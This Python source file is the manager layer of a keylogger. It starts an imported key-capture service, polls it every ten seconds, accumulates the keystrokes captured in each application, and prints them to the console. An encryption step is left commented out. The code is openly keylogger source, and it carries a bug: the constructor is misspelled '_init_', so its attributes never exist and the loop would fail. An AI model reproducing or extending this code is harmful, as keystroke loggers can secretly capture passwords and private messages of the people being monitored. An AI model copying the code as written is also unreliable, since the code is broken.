from key_logger_service import KeyLoggerService
# from encryptor import Encryptor
import time


class KeyLoggerManager:
    def _init_(self):
        self.key_logger = KeyLoggerService()
        # self.encryptor = Encryptor()
        self.recent_key_logs = {}
        self.all_logged_keys = {}



    def run_logger_loop(self):
        self.key_logger.start_logging()

        try:
            while True:
                time.sleep(10)
                self.recent_key_logs = self.get_recently_logged_keys()
                self.update_total_logs()
                # self.recent_key_logs = self.encrypt_logged_keys()
                self.display_logged_keys()

        except KeyboardInterrupt:
            print("\nStopping key logger...")
            self.key_logger.stop_logging()

    def get_recently_logged_keys(self):
        return self.key_logger.get_logged_keys()

    def update_total_logs(self):
        for timestamp, apps in self.recent_key_logs.items():
            if timestamp not in self.all_logged_keys:
                self.all_logged_keys[timestamp] = {}

            for app, keys in apps.items():
                if app in self.all_logged_keys[timestamp]:
                    self.all_logged_keys[timestamp][app] += keys
                else:
                    self.all_logged_keys[timestamp][app] = keys

    # def encrypt_logged_keys(self):
    #    return self.encryptor.encrypt_logged_keys()

    def display_logged_keys(self):
        print("\n=== Recently Logged Keys (Last 10 Seconds) ===")
        if self.recent_key_logs:
            for timestamp, apps in self.recent_key_logs.items():
                print(f"{timestamp}:")
                for app, keys in apps.items():
                    print(f"  - {app}: {keys}")
        else:
            print("No keys logged in the last 10 seconds.")

        print("\n=== Total Logged Keys (Since Start) ===")
        if self.all_logged_keys:
            for timestamp, apps in self.all_logged_keys.items():
                print(f"{timestamp}:")
                for app, keys in apps.items():
                    print(f"  - {app}: {keys}")
        else:
            print("No keys logged since the start.")